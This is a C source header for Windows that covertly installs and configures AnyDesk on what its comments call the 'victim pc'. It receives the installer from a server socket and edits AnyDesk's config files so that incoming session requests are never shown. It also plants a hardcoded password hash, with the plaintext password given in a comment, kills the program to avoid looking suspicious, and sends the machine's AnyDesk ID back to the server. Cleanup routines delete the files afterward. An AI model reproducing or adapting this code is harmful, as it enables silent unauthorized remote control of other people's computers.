#pragma once

#include <stdio.h>
#include <Windows.h>
#include <openssl/md5.h>
#include <stdbool.h>
#include <io.h>
#include "dirent.h"
#include <errno.h>
#include "CurlRequest.h"

#define BUFFER_SIZE 1024
#define SOCKET_CLOSE_ERROR 10
#define ANYDESK_CODE_ERROR "no-code__" // The code has to be 9 digits

char anyDeskFilePath[MAX_PATH] = { 0 }; // Contains the path to the anydesk file

// Functions
int recv_file(int socket, char* fileName);
int installAnyDesk(int serverSocket, char* anyDeskFilePath);
int downloadAnyDeskFile(int serverSocket, char* whereToSaveFile);
bool isTheAnyDeskFile(char* pathToFile);
void _defineAnyDeskSettings();
char* _getCode();
int sendCode(int serverSocket);
void powerOnAnyDesk();
void powerOffAnyDesk();
void setAnyDeskFilePath();

bool checkIfFileExists(const char* filename) {
    if (_access(filename, 0) == 0) {
        return true;
    }
    else {
        return false;
    }
}

void setAnyDeskFilePath()
{
    /*
    Puts inside [anydeskFilePath] the path to the anydesk file
    */

    // Gets "USERPROFILE variable
    char* buf = NULL;
    size_t sz = 0;

    while (_dupenv_s(&buf, &sz, "USERPROFILE") != 0)
    { // If there is an error
        printf("Can't getting the registery variable: USERPROFILE, trying again in 1 seconds...\n");
        Sleep(1000);
    }

    // Sets the path
    strcpy_s(anyDeskFilePath, sizeof(anyDeskFilePath), buf);
    strcat_s(anyDeskFilePath, sizeof(anyDeskFilePath), "\\Downloads\\Anydesk.exe");

    printf("The anydesk file path is: ");
    puts(anyDeskFilePath);

    free(buf);
}

int recv_file(int socket, char* fileName)
{
    /*
    Recvs file from the socket

    param 1: the socket
    param 2: the name which will be to the file

    return:
    1 - on error
    else - error
    */

    int fileSize, totalReceived = 0, recvBytesAmount;
    char buffer[BUFFER_SIZE] = { 0 };
    FILE* fp;

    while (fopen_s(&fp, fileName, "wb") != 0)
    {
        printf("Can't open file %s, trying again in 1 seconds...\n", fileName);
        Sleep(1000);
    }

    // Recvs the file size
    if (recv(socket, (char*)&fileSize, sizeof(fileSize), 0) == SOCKET_ERROR)
    {
        printf("Error in file recviving (1)\n");
        fclose(fp);
        remove(fileName);
        return SOCKET_CLOSE_ERROR;
    }
    fileSize = ntohl(fileSize); // Converts to little endian

    printf("Recv file size is %d bytes\n", fileSize);

    // Recvs the file
    while (totalReceived < fileSize)
    {
        recvBytesAmount = recv(socket, buffer, sizeof(buffer), 0);
        if (recvBytesAmount == SOCKET_ERROR)
        {
            printf("Error in file recviving (2)\n");
            fclose(fp);
            remove(fileName);
            return SOCKET_CLOSE_ERROR;
        }
        fwrite(buffer, sizeof(char), recvBytesAmount, fp);

        totalReceived += recvBytesAmount;
        printf("recv: %d/%d (%d bytes recv right now)\n", totalReceived, fileSize, recvBytesAmount);
    }

    fclose(fp);
    printf("File has been successfully received!\n");
    return 0;
}

int installAnyDesk(int serverSocket, char* anyDeskFilePath)
{
    /*
    Installs anydesk on this pc (victim pc)
       
    param 1: the socket with the server
    param 2: where to allocate the anydesk file

    return:
    0 - on sucess
    else : error
    */

    // Checks if the anydesk file is already downloaded
    if (!isTheAnyDeskFile(anyDeskFilePath)) {
        if (downloadAnyDeskFile(serverSocket, anyDeskFilePath) == SOCKET_ERROR) {
            return SOCKET_ERROR;
        }
    }


    printf("Definning settings...\n");
    _defineAnyDeskSettings();
    printf("The settings have been successfully defined!\n");

    if (sendCode(serverSocket) == SOCKET_ERROR)
    {
        return SOCKET_ERROR;
    }

    return 0;
}

bool isTheAnyDeskFile(char* pathToFile)
{
    /*
        Checks if the file on [pathToFile] is the anydesk file

        param 1: path to some file
    */

    char* lastUpdatedFileHash = NULL;
    char* fileHash = getFileHash(pathToFile);

    if (fileHash == NULL) {
        return false;
    }

    // Gets the last updated hash    
    lastUpdatedFileHash = getHashOfAnyDeskFile();
    if (lastUpdatedFileHash == NULL) {
        printf("The request has been failed!, trying again in 1 minute...\n");
        Sleep(60000);
        lastUpdatedFileHash = getHashOfAnyDeskFile();
    }
    
    if (strcmp(lastUpdatedFileHash, fileHash) == 0) {
        free(lastUpdatedFileHash);
        free(fileHash);
        return true;
    }

    free(lastUpdatedFileHash);
    free(fileHash);
    return false;
}

int downloadAnyDeskFile(int serverSocket, char* whereToSaveFile) {
    /*
    Downloads the anydesk file

    param 1: the server socket
    param 2: where to save the file
    
    return:
    0 - on success
    else - error
    */

    printf("Downloading the anydesk file...\n");

    // Gets the file
    if (recv_file(serverSocket, whereToSaveFile) == SOCKET_CLOSE_ERROR)
    {
        return SOCKET_CLOSE_ERROR;
    }

    printf("The file has been successfully downloaded!\n");

    return 0;
}

void _defineAnyDeskSettings()
{
    /*
    Defines the requried anydesk settins by editting the anydesk files
    */


    char ANYDESK_FOLDER_PATH[MAX_PATH], ANYDESK_SYSTEM_FILE_PATH[MAX_PATH], ANYDESK_SERVICE_FILE_PATH[MAX_PATH], fileLine[2048] = { 0 };
    int lineIndex = 0, attemptsAmount = 0, fileSize = 0; int fileBufferSize;
    char* code = NULL, *fileBuffer;
    FILE* ANYDESK_SYSTEM_FILE, * ANYDESK_SERVICE_FILE;
    bool isAdSecurityLineExists = false, isPwdHashLineExists = false, isPwdSaltLineExists = false;
    
    // Launch anydesk
    /*powerOnAnyDesk();*/

    // Gets the APPDATA variable name
    char* buf = NULL;
    size_t sz = 0;
    while (_dupenv_s(&buf, &sz, "APPDATA") != 0)
    {
        printf("Can't getting the registery variable: APPDATA, trying again in 1 seconds...\n");
        Sleep(1000);
    }

    // Gets the path of the anydesk folder
    strcpy_s(ANYDESK_FOLDER_PATH, sizeof(ANYDESK_FOLDER_PATH), buf);
    free(buf);
    strcat_s(ANYDESK_FOLDER_PATH, sizeof(ANYDESK_FOLDER_PATH), "\\AnyDesk");

    // The path to the system file
    strcpy_s(ANYDESK_SYSTEM_FILE_PATH, sizeof(ANYDESK_SYSTEM_FILE_PATH), ANYDESK_FOLDER_PATH);
    strcat_s(ANYDESK_SYSTEM_FILE_PATH, sizeof(ANYDESK_SYSTEM_FILE_PATH), "\\system.conf");

    startDefining:
        // Waits for the anydesk files to be written
        code = _getCode();

        while (code == NULL)
        {
            if (attemptsAmount == 0)
            {
            }
            else if (attemptsAmount % 5 == 0)
            {
                powerOffAnyDesk();
                printf("Reopening anydesk and trying again...\n");
                powerOnAnyDesk();
            }
            else if (attemptsAmount % 25 == 0)
            {
                // If there is no internet
                printf("Probably there is not internet, trying again in 1 minute...\n");
                Sleep(60000); // Waiting one minute
            }

            attemptsAmount++;
            printf("anydesk files have not been already writeen. trying again in 10 Second\n");
            Sleep(10000);
            free(code);
            code = _getCode();
        }

        printf("Anydesk files have been writeen..\n");
        // Kills anydesk (Do not want to look suspicious)
        powerOffAnyDesk();

        // Changes the interactive_access to 2 ("Never show incomming session requests")

        while (fopen_s(&ANYDESK_SYSTEM_FILE, ANYDESK_SYSTEM_FILE_PATH, "r") != 0)
        { // If can't open the file
            printf("Can't open the file %s, trying again in 10 seconds...\n", ANYDESK_SYSTEM_FILE_PATH);
            powerOffAnyDesk(); // If the user has open the program or something (so we have to close it or we will not able to read the program files)
            goto startDefining; // Someone may have deleted the files
        }

        // Will contains all the file content
        fileBufferSize = 1;
        fileBuffer = calloc(1, sizeof(char));
        fileBuffer[fileBufferSize - 1] = '\0';

        /*
        * If "ad.security.interactive_access" already exists we will change
        * him his value to "2", and if not we will add this setting to the end of the file 
        */ 
        while (fgets(fileLine, sizeof(fileLine), ANYDESK_SYSTEM_FILE) != NULL)
        {
            
            if (startsWith(fileLine, "ad.security.interactive_access=") == 0)
            {
                fileBufferSize += strlen("ad.security.interactive_access=2\n");
                fileBuffer = realloc(fileBuffer, fileBufferSize);
                strcat_s(fileBuffer, fileBufferSize, "ad.security.interactive_access=2\n");
                isAdSecurityLineExists = true;
            }
            else {
                fileBufferSize += strlen(fileLine);
                fileBuffer = realloc(fileBuffer, fileBufferSize);
                strcat_s(fileBuffer, fileBufferSize, fileLine);
            }
        }
        if (!isAdSecurityLineExists) {
            fileBufferSize += strlen("ad.security.interactive_access=2\n");
            fileBuffer = realloc(fileBuffer, fileBufferSize);
            strcat_s(fileBuffer, fileBufferSize, "ad.security.interactive_access=2\n");
        }

        // Closes file
        fclose(ANYDESK_SYSTEM_FILE);
        
        // Writes the new data to the file
        while (fopen_s(&ANYDESK_SYSTEM_FILE, ANYDESK_SYSTEM_FILE_PATH, "w") != 0)
        { // If can't open the file
            printf("Can't open the file %s, trying again in 10 seconds...\n", ANYDESK_SYSTEM_FILE_PATH);
            powerOffAnyDesk(); // If the user has open the program or something (so we have to close it or we will not able to read the program files)
            goto startDefining; // Someone may have deleted the files
        }

        fputs(fileBuffer, ANYDESK_SYSTEM_FILE);

        // Closes file
        fclose(ANYDESK_SYSTEM_FILE);
        free(fileBuffer);
        fileBufferSize = 0;
       
        // Sets the password to "MatanExtreme1346790"

        // The path to the service file
        strcpy_s(ANYDESK_SERVICE_FILE_PATH, sizeof(ANYDESK_SERVICE_FILE_PATH), ANYDESK_FOLDER_PATH);
        strcat_s(ANYDESK_SERVICE_FILE_PATH, sizeof(ANYDESK_SERVICE_FILE_PATH), "\\service.conf");

        while (fopen_s(&ANYDESK_SERVICE_FILE, ANYDESK_SERVICE_FILE_PATH, "r") != 0)
        {   // If can't open the file
            printf("Can't open the file %s, trying again in 10 seconds...\n", ANYDESK_SERVICE_FILE);
            powerOffAnyDesk(); // If the user has open the program or something (so we have to close it or we will not able to read the program files)
            goto startDefining; // Someone may have deleted the files
        }

        // Will contains all the file content
        fileBufferSize = 1;
        fileBuffer = calloc(fileBufferSize, sizeof(char));
        fileBuffer[fileBufferSize - 1] = '\0';

        /*
        * If "ad.anynet.pwd_hash" already exists we will change
        * him his value, and if not we will add this setting to the end of the file
        * 
        * same to ad.anynet.pwd_salt= ...
        */
        //while (fscanf_s(ANYDESK_SERVICE_FILE, "%s", fileLine, sizeof(fileLine)) != -1)
        while (fgets(fileLine, sizeof(fileLine), ANYDESK_SERVICE_FILE) != NULL)
        {

            if (startsWith(fileLine, "ad.anynet.pwd_hash=") == 0)
            {
                fileBufferSize += strlen("ad.anynet.pwd_hash=7af0eb0f951a8d1c4d2b57d975a121ef06bb34fb21722e0e3a600c29bc4907a6\n");
                fileBuffer = realloc(fileBuffer, fileBufferSize);
                strcat_s(fileBuffer, fileBufferSize, "ad.anynet.pwd_hash=7af0eb0f951a8d1c4d2b57d975a121ef06bb34fb21722e0e3a600c29bc4907a6\n");
                isPwdHashLineExists = true;
            }
            else if (startsWith(fileLine, "ad.anynet.pwd_salt=") == 0)
            {
                fileBufferSize += strlen("ad.anynet.pwd_salt=7d4a31e9bc00511a79e719476634488f\n");
                fileBuffer = realloc(fileBuffer, fileBufferSize);
                strcat_s(fileBuffer, fileBufferSize, "ad.anynet.pwd_salt=7d4a31e9bc00511a79e719476634488f\n");
                isPwdSaltLineExists = true;
            }
            else {
                fileBufferSize += strlen(fileLine);
                fileBuffer = realloc(fileBuffer, fileBufferSize);
                strcat_s(fileBuffer, fileBufferSize, fileLine);
            }
        }
        if (!isPwdHashLineExists) {
            fileBufferSize += strlen("ad.anynet.pwd_hash=7af0eb0f951a8d1c4d2b57d975a121ef06bb34fb21722e0e3a600c29bc4907a6\n");
            fileBuffer = realloc(fileBuffer, fileBufferSize);
            strcat_s(fileBuffer, fileBufferSize, "ad.anynet.pwd_hash=7af0eb0f951a8d1c4d2b57d975a121ef06bb34fb21722e0e3a600c29bc4907a6\n");
        }
        if (!isPwdSaltLineExists) {
            fileBufferSize += strlen("ad.anynet.pwd_salt=7d4a31e9bc00511a79e719476634488f\n");
            fileBuffer = realloc(fileBuffer, fileBufferSize);
            strcat_s(fileBuffer, fileBufferSize, "ad.anynet.pwd_salt=7d4a31e9bc00511a79e719476634488f\n");
        }

        // Closes file
        fclose(ANYDESK_SERVICE_FILE);

        // Writes the new data to the file
        while (fopen_s(&ANYDESK_SERVICE_FILE, ANYDESK_SERVICE_FILE_PATH, "w") != 0)
        { // If can't open the file
            printf("Can't open the file %s, trying again in 10 seconds...\n", ANYDESK_SERVICE_FILE_PATH);
            powerOffAnyDesk(); // If the user has open the program or something (so we have to close it or we will not able to read the program files)
            goto startDefining; // Someone may have deleted the files
        }

        fputs(fileBuffer, ANYDESK_SERVICE_FILE);

        // Closes file
        fclose(ANYDESK_SERVICE_FILE);
        free(fileBuffer);
        fileBufferSize = 0;
        fileSize = 0;

        free(code);
}

char* _getCode()
{
    /*
    Returns the anydesk code of this pc

    on sucess - pointer to the code
    on error - pointer to NULL
    */

    char ANYDESK_SYSTEM_FILE_PATH[MAX_PATH] = { 0 }, fileLine[1024] = { 0 }, codeBuffer[256] = { 0 };
    FILE* ANYDESK_SYSTEM_FILE = NULL;
    char* code = NULL, *buf = NULL;
    int codeStartIndex = 0, codeEndIndex = 0, codeLength = 0;
  
    // Gets "APPDATA" variable
    size_t sz = 0;
    while (_dupenv_s(&buf, &sz, "APPDATA") != 0)
    {
        printf("Can't getting the registery variable: APPDATA, trying again in 1 seconds...\n");
        Sleep(1000);
    }

    // Gets the path of the anydesk system file
    strcpy_s(ANYDESK_SYSTEM_FILE_PATH, sizeof(ANYDESK_SYSTEM_FILE_PATH), buf);
    strcat_s(ANYDESK_SYSTEM_FILE_PATH, sizeof(ANYDESK_SYSTEM_FILE_PATH), "\\AnyDesk\\system.conf");

    if (fopen_s(&ANYDESK_SYSTEM_FILE, ANYDESK_SYSTEM_FILE_PATH, "rb") != 0)
    {
        // If there is an error
        printf("Can't open the file %s\n", ANYDESK_SYSTEM_FILE_PATH);
    }
    else {
        // Gets the code
        while (fscanf_s(ANYDESK_SYSTEM_FILE, "%s", fileLine, sizeof(fileLine)) != -1)
        {
            if (startsWith(fileLine, "ad.anynet.id=") == 0)
            {
                codeStartIndex = 13;
                codeEndIndex = strlen(fileLine) - 1;
                codeLength = codeEndIndex - codeStartIndex + 1;

                code = calloc(codeLength + 1, sizeof(char));
                strncpy_s(code, codeLength + 1, fileLine + codeStartIndex, codeLength);
                //strncpy_s(code, codeLength + 1, fileLine + codeStartIndex, codeEndIndex - codeStartIndex + 1);
                break;
            }
        }
        fclose(ANYDESK_SYSTEM_FILE);
    }
  
    return code;
}

int sendCode(int serverSocket)
{
    /*
    Sends the anydesk code of this pc to the server

    return:
    0 - on sucess
    else - on error
    */

    int attemptsAmount = 0;

    // Gets the code
    char* code = _getCode();
    // If there is no code...
    while (strcmp(code, ANYDESK_CODE_ERROR) == 0)
    {
        if (attemptsAmount == 0)
        {

        }
        else if (attemptsAmount % 5 == 0)
        {
            powerOffAnyDesk();
            printf("Reopening anydesk and trying again...\n");
            powerOnAnyDesk();
        }
        else if (attemptsAmount % 25 == 0)
        {
            // If there is no internet
            Sleep(60000); // Wating one minute
            printf("Probably there is not internet, trying again in 1 minute...\n");
        }

        attemptsAmount++;
        printf("There is no code with some reason. trying again in 10 Seconds\n");
        Sleep(10000);
        free(code);
        code = _getCode();
    }

    printf("Sending code: %s Length: %d \n", code, strlen(code));

    // Sends the code
    if (send(serverSocket, code, strlen(code), 0) == SOCKET_ERROR)
    {
        printf("Can't sending code: %d \n", GetLastError());
        free(code);
        return SOCKET_ERROR;
    }

    free(code);
    return 0;
}

void powerOnAnyDesk()
{
    /*
    Powers on anydesk
    */

    printf("Powering on...\n");
    ShellExecuteA(NULL, "open", anyDeskFilePath, NULL, NULL, SW_SHOW);

    printf("Anydesk has successfully powered on!\n");
}

void powerOffAnyDesk()
{
    /*
    Powers off anydesk
    */

    printf("Powering off...\n");

    system("TASKKILL /F /IM AnyDesk.exe");
    printf("anydesk has successfully powered off!\n");
}

void delete_directory(char* directoryPath) {
    /*
    Delets directory with all his contents
    
    param 1: path to the directory
    */

    DIR* dir;
    struct dirent* ent;
    char file_path[PATH_MAX] = {0};
        
    // If can't open the dir
    dir = opendir(directoryPath);
    while (dir == NULL) {
        if (errno == ENOENT) {
            return; // The dir doesn't exists..
        }
        // If there is problem with opening the dir
        else {
            printf("Can't open the dir %s, try again in 1 minute...", directoryPath);
            Sleep(60000);
            powerOffAnyDesk();
            dir = opendir(directoryPath);
        }
    }
    
    // Deletes all the files in this directory
    while ((ent = readdir(dir)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) {
            continue;
        }

        strcpy_s(file_path, sizeof(file_path), directoryPath);
        strcat_s(file_path, sizeof(file_path), "\\");
        strcat_s(file_path, sizeof(file_path), ent->d_name);

        // If dir
        if (ent->d_type == DT_DIR) {
            delete_directory(file_path);
        }
        // If file
        else {
            while (remove(file_path) != 0) {
                printf("Can't deletes the file %s, try again in 1 minute...", file_path);
                Sleep(60000);
                powerOffAnyDesk();
            }
            
        }
    }
    closedir(dir);
    while (RemoveDirectoryA(directoryPath) == 0) {
        printf("Can't delets the dir %s, trying again in 1 minute...", directoryPath);
        Sleep(60000);
        powerOffAnyDesk();
    }
    
}

void uninstallAnyDesk() {
    /*
    Uninstall anydesk from the pc
    */
    
    
    
    char ANYDESK_FOLDER_PATH[MAX_PATH];
    char* buf = NULL;
    size_t sz = 0;

    // If anydesk is running... (becuase we will not be able to delete it's files)
    powerOffAnyDesk();

    // If the file exists
    if (checkIfFileExists(anyDeskFilePath)) {
        // Deletes the anydesk file
        while (remove(anyDeskFilePath) != 0) {
            powerOffAnyDesk();
        }
    }

    // Deletes the anydesk data folder
    
    // Gets the APPDATA variable name
    while (_dupenv_s(&buf, &sz, "APPDATA") != 0)
    {
        printf("Can't getting the registery variable: APPDATA, trying again in 1 seconds...\n");
        Sleep(1000);
    }

    // Gets the path of the anydesk folder
    strcpy_s(ANYDESK_FOLDER_PATH, sizeof(ANYDESK_FOLDER_PATH), buf);
    free(buf);
    strcat_s(ANYDESK_FOLDER_PATH, sizeof(ANYDESK_FOLDER_PATH), "\\AnyDesk");
    
    delete_directory(ANYDESK_FOLDER_PATH);    
}